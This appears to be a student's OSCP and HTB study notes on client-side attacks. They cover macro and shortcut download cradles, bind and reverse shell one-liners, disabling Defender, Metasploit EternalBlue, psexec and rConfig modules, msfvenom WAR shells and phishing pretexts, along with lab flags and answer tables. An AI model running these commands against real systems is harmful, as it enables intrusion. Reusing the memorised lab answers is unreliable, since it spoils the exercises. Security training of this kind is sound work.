...
## Tags
#OSCP #Module12 #ClientSideAttacks #SocialEngineering #Reconnaissance #MetadataAnalysis #BindShell #ReverseShell #Metasploit #EternalBlue #LiveEngagement #HTBSupplementary
...
The core idea: client machines inside an org almost never expose services externally, so you can't port-scan your way in. Instead you exploit weaknesses in whatever software the *user* runs locally (browser, OS components, Office), and you need the user to cooperate (even unknowingly) to trigger it. That makes this as much a psychology problem as a technical one, matching everything covered in [[11. Phishing Basics|Phishing Basics]] about pretext and trust, just paired with a different payload category here (documents and library files instead of cloned login pages).

**Worth sitting with for a second:** this module explicitly calls out the ethical line, the goal is code execution, not blackmail, not impersonating law enforcement, not psychologically harming anyone. Same spirit as the "do not target" list mentioned in [[11. Phishing Basics#11.1.1. Email Phishing|11.1.1]], real engagements have real boundaries.
...
- Google dorking: `site:example.com filetype:pdf` (narrow further with keywords for a specific branch/location), reusing the dorking technique from [[06. Information Gathering|Information Gathering]] (Module 6)
...
Hosted `powercat.ps1` from `~` via `python3 -m http.server 80`, started `nc -nvlp 4444`. Built and base64-encoded (UTF-16LE, same requirement as [[09. Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]]'s PowerShell reverse shell) the download cradle via `pwsh`:
```powershell
...
$EncodedText
```
*Same UTF-16LE-then-base64 requirement `powershell -enc` expects, matches [[09. Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]]'s PowerShell reverse shell.*
...
"
```
*Generating the split programmatically rather than manually cutting the string at 50-char intervals avoids fat-fingering a chunk boundary, same mechanical-extraction principle as [[09. Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]]'s curl+sed key extraction lesson. Output is ready to paste straight into the VBA editor, no manual editing needed.*
...
> 🔧 Technique: blocked twice now, for two *different* reasons across two separate sessions. First on a corrupted OFFICE instance (resolved by reverting/rebuilding, see [[12. Client-Side Attacks#🔁 Lab 1 Rebuild (fresh instance, after prior OFFICE VM corruption)|Lab 1 Rebuild]] above), now on TICKETS' own trigger automation not firing. Full plan, exact wording, and granular troubleshooting trail below so this doesn't need re-deriving.
...
>
> **Current leading theory (unconfirmed): the simulated-user watcher script is one-shot, not a repeating loop.** It likely watches for `ticket.doc` to appear, opens/executes it exactly once, then stops checking permanently, regardless of later re-uploads under the same name. The very first upload this session happened *before* the listener was actually running (mid-setup), so if the watcher fired on that first appearance and got no callback destination, it may have already "used up" its only execution and gone quiet for good. Matches [[09. Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]]'s repeated lesson about verifying every piece of infrastructure (listener *and* target) is actually ready before the trigger fires, not after.
...
Right-click the desktop → **New → Shortcut**. In the "type the location" field, point it at PowerShell with a download-cradle argument, same PowerCat pattern as [[12. Client-Side Attacks#12.2.3. Leveraging Microsoft Word Macros|12.2.3]]'s macro payload, just delivered via a shortcut's target instead of VBA:
```powershell
...
**The pretext matters as much as the payload**, matching everything already covered in [[11. Phishing Basics|Phishing Basics]]. Example pretext used here: posing as a new IT team member rolling out a "new management platform," asking the target to open the attachment and double-click a "configuration" shortcut inside it.
...
```
*`-c` runs a single command non-interactively rather than dropping into an interactive `smb: \>` prompt, same idea as [[09. Common Web Application Attacks|Common Web Application Attacks]]'s `smbclient` usage but scripted for a one-shot upload.*
...
🔁 **Similar to:** the overall two-stage "get something trusted-looking in front of the user, deliver the actual payload from infrastructure you control" shape mirrors [[12. Client-Side Attacks#12.2.3. Leveraging Microsoft Word Macros|12.2.3]]'s macro delivery and [[09. Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.3]]'s RFI-hosted-webshell pattern. The core lesson repeats across all of them: the delivery mechanism and the actual execution payload don't have to be the same file, splitting them is often what gets past filtering in the first place.
...
## 12.4. Shells and Payloads Fundamentals

Once a client-side vector above actually lands, this is the "now what" layer: what kind of shell you get, how to catch it, and the go-to payload options for automating delivery, HTB Academy content the Offsec modules leave scattered rather than teaching as its own unit.

### 12.4.1. Shell Types: Interactive, Bind, and Reverse

A **shell** exposes OS services through a command line. **Interactive** shells (SSH, RDP, a working reverse shell) give you a live prompt; **non-interactive** ones (cron jobs, scheduled tasks, most initial web/macro RCE) run a command and exit, upgrading one to the other is usually the first order of business after landing.

**Bind shell**: the target opens a listening port and waits for you to connect in, the target is the server. Useful when inbound is allowed (rare on hardened networks) or you want a persistent backdoor on a network you already control.
```bash
# On the target (Linux, FIFO named-pipe pattern)
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc -l TARGET_IP PORT > /tmp/f
```
`mkfifo` creates a named pipe that blocks until both ends are open; `cat` feeds it into an interactive bash, whose output pipes back out through `nc`'s listener into the same pipe, one bidirectional loop over a single TCP connection. Connect from Kali with `nc -nv TARGET_IP PORT`.

> 🔧 **Technique:** a bind shell leaves an open port visible in `netstat -tlnp` and any subsequent Nmap scan. Clean up the listener and the FIFO when done.

**Reverse shell**: the target connects back to *your* listener, almost always preferred since outbound connections are far less likely to be blocked and no new port opens on the target.
```bash
sudo nc -lvnp 443   # start first; port 443 is the most commonly-allowed outbound port
```
```powershell
# Full PowerShell reverse shell one-liner (run on the Windows target)
...
```
`-nop` skips loading a profile (faster, fewer detection hooks). If Windows Defender blocks it outright ("This script contains malicious content"), and you already have admin: `Set-MpPreference -DisableRealtimeMonitoring $true` disables real-time protection for the current boot (loud, logs to the Event Log, but effective).

> 🔍 **Worth remembering generally:** if a reverse shell on a non-standard port fails, try 443, then 80, then 53, in roughly that order of how permissive corporate outbound firewalls tend to be.

**Check your own PowerShell environment first**, on Kali or the target, before assuming feature availability:
```powershell
pwsh; $PSVersionTable; $PSVersionTable.PSEdition   # Core = cross-platform PS7+, Desktop = Windows-only PS5
```
...
| Question | Answer |
|---|---|
| Bind shell: port for `nc -lvnp 443`? | **443** |
| Bind shell: flag at /customscripts/flag.txt? | **B1nD_Shells_r_cool** |
| Reverse shell: which side is the client? | **client** (the target) |
| Reverse shell: hostname of the Windows RDP target? | **SHELLS-WIN10** |
| PSEdition on Pwnbox? | **Core** |

#### Tags: #Shell #BindShell #ReverseShell #mkfifo #PowerShell #TCPClient #WindowsDefender #Module12

---

### 12.4.2. Automating Delivery: Metasploit, Payload Types, and Known Exploits

**Authenticated lateral movement via MSF psexec**, when you already have valid credentials:
```bash
use exploit/windows/smb/psexec
set RHOSTS TARGET_IP; set SHARE ADMIN$; set SMBUser <user>; set SMBPass <pass>; set LHOST KALI_IP
exploit
```
Same underlying pattern as [[16. Password Attacks#16.3.2. Passing NTLM|16.3.2]]'s `impacket-psexec`, just delivering a Meterpreter payload instead of a direct shell. Default callback port 4444, change with `set LPORT 443` if that's blocked.

**Payload file types worth recognising on sight:**

| Extension | Type | Notes |
|-----------|------|-------|
| `.exe` | PE executable | `msfvenom -f exe`, most common |
| `.dll` | Dynamic-link library | DLL hijacking/injection |
| `.bat` | DOS batch script | No compilation needed |
| `.vbs` | VBScript | Scriptable automation, common in macros |
| `.ps1` | PowerShell script | Execution-policy bypass often needed |
| `.war` | Web Application Archive | Java/Tomcat, see [[09. Common Web Application Attacks#9.6. Attacking Common Applications|9.6]] |
| `.hta` | HTML Application | Runs directly via `mshta.exe` |

**MS17-010 / EternalBlue (CVE-2017-0144)**, the 2017 Shadow Brokers NSA leak targeting Windows SMB, affects XP through unpatched Server 2016, gives `NT AUTHORITY\SYSTEM` with no credentials at all:
```bash
use exploit/windows/smb/ms17_010_psexec
set RHOSTS TARGET_IP; set LHOST KALI_IP
exploit
```
> 🔧 **Technique:** `ms17_010_psexec` is the more reliable variant over the raw `ms17_010_eternalblue` module, it uses the exploit to gain a foothold but then hands off to PSExec for a stabler session. Already covered from the detection side in [[07. Vulnerability Scanning#7.2.4. Analyzing the Results|7.2.4]] (Nessus) and [[07. Vulnerability Scanning#7.3.2. Working with NSE Scripts|7.3.2]] (`smb-vuln-ms17-010.nse`); [[14. Fixing Exploits|Fixing Exploits]] covers doing the same exploit manually without Metasploit.

**rConfig 3.9.6 authenticated RCE** (CVE-2019-19585, network device config manager, default creds `admin:admin`):
```bash
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
set RHOSTS TARGET_IP; set LHOST KALI_IP; set SRVHOST KALI_IP
exploit
```
> 🔍 **Worth remembering generally:** rConfig's whole purpose is storing router/switch configs, so a shell on it is worth checking `/devicedetails/` for stored network-device credentials, that's usually the actual prize, not the box itself.

**Lab status: ✅ Completed:**

| Question | Answer |
|---|---|
| MSF psexec: filename found in htb-student's Documents? | **staffsalaries.txt** |
| Infiltrating Windows: DOS script extension? | **.bat** |
| Infiltrating Windows: Shadow Brokers leak name? | **MS17-010** |
| Infiltrating Windows: flag at C:\flag.txt (EternalBlue)? | **EB-Still-W0rk$** |
| Infiltrating Linux: rconfig_vendors payload language? | **php** |
| Infiltrating Linux: router hostname in /devicedetails? | **edgerouter-isp** |

#### Tags: #Metasploit #psexec #PayloadTypes #EternalBlue #MS17010 #rConfig #Module12

---

### 12.4.3. Live Engagement: Multi-Host Chain

A simulated internal network reachable only from a jump host (RDP in first), three targets, one methodology repeated three times: **enumerate → pick the matching exploit → set LHOST to the jump host's *internal* IP, never Kali's external one → catch the shell.**

```
Internet -> Jump Host (172.16.1.5) -> Host-1 172.16.1.11 (Tomcat :8080)
                                    -> Host-2 172.16.1.12 (Ubuntu, PHP blog)
                                    -> Host-3 172.16.1.13 (Windows, EternalBlue)
```

- **Host-1 (Tomcat 10.0.11, creds `tomcat:Tomcatadm`)**: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=9001 -f war -o shell.war`, deploy via Manager App (same pattern as [[09. Common Web Application Attacks#9.6. Attacking Common Applications|9.6]]'s Tomcat section). Flag context: `C:\Shares\dev-share`.
- **Host-2 (Apache 2.4.41/Ubuntu, "Lightweight Facebook-styled blog" 1.3, creds `admin:admin123!@#`)**: EDB-50064 authenticated RCE via `use 50064.rb` in MSF, lands a PHP Meterpreter bind shell. Flag: `cat /customscripts/flag.txt` → **B1nD_Shells_r_cool**.
- **Host-3 (Windows Server 2016, SMB 445)**: `exploit/windows/smb/ms17_010_psexec` straight to `NT AUTHORITY\SYSTEM`. Flag: `cat C:/Users/Administrator/Desktop/Skills-flag.txt` → **One-H0st-Down!**.

> 🔍 **Worth remembering generally:** from a jump host, LHOST for every callback has to be the jump host's own internal-network IP, the targets can reach it, they can't reach your external Kali box. `ip a | grep <internal-subnet>` from the jump host finds the right interface every time.
...
| Folder in C:\Shares\ on Host-1? | **dev-share** |
| Linux distro on Host-2? | **ubuntu** |
| Shell language in the 50064.rb exploit? | **php** |
| Flag at /customscripts/flag.txt (Host-2)? | **B1nD_Shells_r_cool** |
| Hostname of Host-3? | **shells-winblue** |
| Flag at Skills-flag.txt (Host-3)? | **One-H0st-Down!** |

#### Tags: #LiveEngagement #MultiHost #JumpHost #Pivot #Tomcat #EternalBlue #PHPBlog #Module12

**🎯 Related Boxes for 12.4's shell/payload techniques specifically:**
- **[Blue](https://0xdf.gitlab.io/2021/05/11/htb-blue.html)** (HTB, Windows, Easy): MS17-010/EternalBlue, direct practice of 12.4.2 and the Live Engagement Host-3 chain.
- **[Jerry](https://0xdf.gitlab.io/2019/02/21/htb-jerry.html)** (HTB, Windows, Easy): Tomcat Manager default creds → WAR deploy → SYSTEM, textbook practice of 12.4.3's Host-1 pattern (and [[09. Common Web Application Attacks#9.6. Attacking Common Applications|Module 9.6]]'s Tomcat section).
- **[Grandpa](https://www.hackthebox.com/machines/grandpa)** (HTB, Windows, Easy): IIS 6.0 WebDAV buffer overflow, similar "old unpatched Windows service straight to SYSTEM" shape as 12.4.2's EternalBlue.
- **[Bashed](https://0xdf.gitlab.io/2018/04/29/htb-bashed.html)** (HTB, Linux, Easy): a webshell (phpbash) is already planted on the box, the exercise is upgrading it to an interactive shell, direct practice of 12.4.1's bind/reverse-shell mechanics.

---

## 12.5. Wrapping Up

Client-side attacks earn their keep specifically against internal, non-routable networks, exactly the environment where a straight port-scan-and-exploit approach ([[09. Common Web Application Attacks|Common Web Application Attacks]]'s whole territory) has nothing to reach. Instead of attacking exposed services, this whole module attacked *trust*: trust in a familiar Office macro prompt ([[12. Client-Side Attacks#12.2. Exploiting Microsoft Office|12.2]]), trust in what looks like a local folder ([[12. Client-Side Attacks#12.3. Abusing Windows Library Files|12.3]]), and underneath both of those, trust built through reconnaissance and pretext ([[12. Client-Side Attacks#12.1. Target Reconnaissance|12.1]], and everything from [[11. Phishing Basics|Phishing Basics]] before it). Worth carrying forward: on an internal engagement, this is very often the only way in at all.
...
- [[OSCP/BOXES/WRITE UPS/Linux/Pebbles|Pebbles]] -- SQL injection and database escalation
- [[Sea|Sea]] -- web application attack chain
